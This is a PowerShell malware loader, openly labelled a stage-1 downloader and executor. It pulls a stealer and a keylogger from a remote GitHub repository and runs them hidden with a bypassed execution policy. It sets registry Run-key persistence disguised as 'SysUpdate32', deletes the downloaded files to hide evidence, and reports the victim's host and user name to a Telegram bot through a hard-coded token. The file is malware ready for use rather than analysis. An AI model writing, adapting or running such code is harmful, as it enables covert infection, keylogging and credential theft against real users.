# payload_final.ps1 — Stage 1 downloader/executor
# Downloads stealer.ps1, keylogger.ps1, executes them, sends SUCCESS to Telegram

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$repoBase = "https://raw.githubusercontent.com/isajarGamer2/stealer-repo/main"
$workDir = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$tempDir = "$env:TEMP\sysupdate_$(Get-Random -Maximum 9999)"

# Create working directory
New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
Set-Location $tempDir

# Download components with cache-busting
$files = @("stealer.ps1", "keylogger.ps1")
foreach ($file in $files) {
    $url = "$repoBase/$file?v=$(Get-Random)"
    try {
        Invoke-WebRequest -Uri $url -UseBasicParsing -OutFile "$tempDir\$file" -ErrorAction Stop
        Write-Host "[+] Downloaded: $file" -ForegroundColor Green
    } catch {
        Write-Host "[-] Failed: $file - $($_.Exception.Message)" -ForegroundColor Red
        exit 1
    }
}

# Verify downloads
foreach ($file in $files) {
    if (-not (Test-Path "$tempDir\$file")) {
        Write-Host "[-] Missing: $file" -ForegroundColor Red
        exit 1
    }
    $size = (Get-Item "$tempDir\$file").Length
    Write-Host "[*] $file : $size bytes" -ForegroundColor Cyan
}

# Execute stealer (steals tokens, starts keylogger job)
Write-Host "[*] Executing stealer.ps1..." -ForegroundColor Yellow
powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File "$tempDir\stealer.ps1"

# Persistence - Registry Run key
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regName = "SysUpdate32"
$regValue = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$tempDir\stealer.ps1`""
try {
    Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -Force
    Write-Host "[+] Persistence established: $regName" -ForegroundColor Green
} catch {
    Write-Host "[-] Persistence failed: $($_.Exception.Message)" -ForegroundColor Red
}

# Cleanup evidence
Remove-Item "$tempDir\*.ps1" -Force -ErrorAction SilentlyContinue

# SUCCESS signal
Write-Host ""
Write-Host "SUCCESS" -ForegroundColor Green -BackgroundColor Black
Write-Host ""

# Send success to Telegram
$botToken = "8785045003:AAGsICsqOyT3t_luH2Y4WQSJ746dnbZZby4"
$chatId = "8445047233"
$msg = "[+] PAYLOAD EXECUTED`nHost: $env:COMPUTERNAME`nUser: $env:USERNAME`nTime: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
try {
    Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body @{
        chat_id = $chatId
        text = $msg
    } | Out-Null
} catch {}
